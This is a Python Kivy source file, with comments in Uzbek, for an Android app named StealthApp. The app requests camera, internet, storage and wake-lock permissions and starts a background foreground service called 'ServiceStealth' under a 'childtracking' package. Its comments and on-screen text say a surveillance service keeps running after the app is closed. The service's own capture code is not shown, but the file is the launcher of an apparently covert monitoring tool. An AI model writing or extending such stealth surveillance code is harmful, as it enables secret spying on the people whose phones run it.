from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.utils import platform

class StealthApp(App):
    def build(self):
        # Bu qism faqat ruxsatlarni so'rash va xizmatni ishga tushirish uchun qisqa vaqt ochiladi.
        # Ruxsat olingandan keyin ilova orqa fonga o'tadi yoki yopilsa ham service ishlayveradi.
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.INTERNET,
                Permission.FOREGROUND_SERVICE,
                Permission.WAKE_LOCK,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE
            ])
            self.start_foreground_service()
            
        layout = BoxLayout(orientation='vertical')
        layout.add_widget(Label(text="Kuzatuv xizmati faollashdi.\nIlovani yopishingiz mumkin (Orqa fonda ishlaydi)."))
        return layout

    def start_foreground_service(self):
        from jnius import autoclass
        mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
        # Xizmat nomini buildozer.spec da qanday nomlasak, shunday yozamiz
        service_name = "org.childtracking.bot.ServiceStealth" 
        context = mActivity.getApplicationContext()
        service_class = autoclass(service_name)
        intent = autoclass('android.content.Intent')(context, service_class)
        intent.putExtra("pythonServiceArgument", "")
        # Android O dan boshlab Foreground Service sifatida ishga tushirish
        if autoclass('android.os.Build$VERSION').SDK_INT >= 26:
            mActivity.startForegroundService(intent)
        else:
            mActivity.startService(intent)

if __name__ == '__main__':
    StealthApp().run()
